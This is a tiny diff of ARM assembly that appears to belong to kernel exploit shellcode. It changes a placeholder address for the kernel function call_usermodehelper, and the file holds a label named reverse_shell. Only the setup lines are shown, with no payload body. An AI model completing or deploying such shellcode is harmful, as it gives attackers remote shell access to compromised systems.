@@ -1,7 +1,7 @@
 .syntax unified
 .global _start
 
-.set call_usermodehelper, 0xdeadbe02
+.set call_usermodehelper, 0xdeadbe01
 _start:
 
 reverse_shell:
